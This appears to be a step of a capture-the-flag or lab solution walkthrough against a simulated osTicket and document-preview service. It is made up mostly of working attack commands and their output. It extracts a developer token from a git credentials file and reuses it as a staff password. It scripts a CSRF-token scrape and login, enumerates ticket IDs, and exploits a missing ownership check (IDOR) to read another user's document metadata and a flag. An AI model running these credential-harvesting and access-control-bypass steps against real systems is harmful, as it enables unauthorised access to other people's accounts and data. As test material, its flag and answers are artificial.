## Prerequisite

panel (Rowan's staff login reuses the developer token as its password).

```
CA=~/.local/share/keplerops/ca.crt

DEV=$(sed -E 's#https://[^:]+:([^@]+)@.*#\1#' ~/.config/git/credentials)
```

## Find the protected attachment id in the SUP-2841 thread

Log into the osTicket agent panel and read the SUP-2841 thread. The thread names
the protected attachment for maya.ranscombe's maintenance review.

```
csrf=$(curl -sS --cacert "$CA" -c /tmp/ost.jar "$BASE/scp/login.php" \
  | grep -oP 'name="__CSRFToken__"[^>]*value="\K[^"]+' | head -1)
curl -sS --cacert "$CA" -b /tmp/ost.jar -c /tmp/ost.jar -o /dev/null \
  --data-urlencode "__CSRFToken__=$csrf" --data-urlencode "userid=rowan.ito" \
  --data-urlencode "passwd=$DEV" --data-urlencode "submit=Log In" "$BASE/scp/login.php"
tid=""
for i in $(seq 1 25); do
  if curl -sS --cacert "$CA" -b /tmp/ost.jar "$BASE/scp/tickets.php?id=$i" | grep -q "ARWC connector callback latency"; then tid=$i; break; fi
done
curl -sS --cacert "$CA" -b /tmp/ost.jar "$BASE/scp/tickets.php?id=$tid" \
  | grep -oE 'asset SUP-K-2841'
```

Output: `asset SUP-K-2841`

The protected attachment is `SUP-K-2841`.

## Read the restricted preview association (K10.1 acceptance check)

The `preview.association` route returns the document identity and case binding
for any supplied attachment id; it does not check that the caller owns the case.

```
curl -sk -u "rowan.ito:$DEV" \
  "https://preview.keplerops.test/api/preview/association?source=SUP-K-2841"
```

Output:

```json
{"flag":"FLAG{e79c34cd2ef12e6e}","schema":"fieldkest.preview-association/v1","source_id":"SUP-K-2841","document_id":"DOC-9BC054D6F95DFA6A","owner":"maya.ranscombe","case_id":"CAS-MAYA-2841","source_version":"cb72f4a8","viewer_request":"PRV-771"}
```

`document_id=DOC-9BC054D6F95DFA6A` and `source_version=cb72f4a8` carry into K10.2.

Gate: anonymous access is 401; an unknown source id is 404.
